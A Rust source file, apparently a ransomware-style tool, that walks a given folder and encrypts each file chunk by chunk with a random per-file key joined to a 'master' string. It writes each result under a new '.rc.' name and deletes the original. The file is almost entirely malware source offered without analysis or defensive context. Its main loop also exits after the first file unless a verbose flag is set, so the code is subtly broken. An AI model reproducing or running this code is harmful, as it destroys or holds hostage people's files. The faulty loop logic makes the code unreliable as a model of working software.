use std::env;
use std::path::PathBuf;
use std::io::{Read, Write};
use std::fs::File;

use lib::misc::{has_val, get_val, gen_str};
use lib::crypto::encrypt;
use lib::file::delete_file;
use lib::{KEY_LEN, EXT_LEN};

const SUFFIX: &str = ".rc.";
const CHUNK: usize = 1 * 1024 * 1024;

fn main() {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>();

    let verbose = has_val(&args, "verbose");
    let master = get_val(&args, "master");
    let folder = get_val(&args, "folder");

    let files = lib::file::get_files(folder);
    for file in &files {
        match process_file(file, &master) {
            Ok(_) => {
                if !verbose {
                    return;
                }

                println!("[-] encrypted for: {}", file.display());
            },
            Err(err) => {
                if !verbose {
                    return;
                }

                println!("[!] failed for: {} - {}", file.display(), err);
            }
        };
    }
}

pub fn process_file(file: &PathBuf, master: &str) -> Result<(), &'static str> {
    let key = gen_str(KEY_LEN);
    let suffix = gen_str(EXT_LEN);

    let full_key = format!("{}{}{}", key, suffix, master);

    let mut dec_file = File::open(file)
        .map_err(|_| "failed to open file")?;

    let new_file = {
        let name = file
            .file_name()
            .ok_or("failed to get file name")?
            .to_string_lossy();

        let new_name = format!("{}{}{}", name, SUFFIX, suffix);

        let mut path = PathBuf::from(file);
        path.set_file_name(new_name);
        path
    };

    let mut enc_file = File::create(&new_file)
        .map_err(|_| "failed to create encrypted file")?;

    enc_file
        .write_all(key.as_bytes())
        .map_err(|_| "failed to write to encrypted file")?;

    let mut buffer = vec![0u8; CHUNK];

    loop {
        let bytes = dec_file
            .read(&mut buffer)
            .map_err(|_| "failed to read from file")?;

        if bytes == 0 {
            break;
        }

        let chunk = &buffer[..bytes];
        let encrypted = encrypt(chunk, full_key.as_bytes());

        enc_file
            .write_all(&encrypted)
            .map_err(|_| "failed to write to encrypted file")?;
    }

    drop(dec_file);
    drop(enc_file);

    delete_file(file)
        .map_err(|_| "failed to delete file")?;

    Ok(())
}
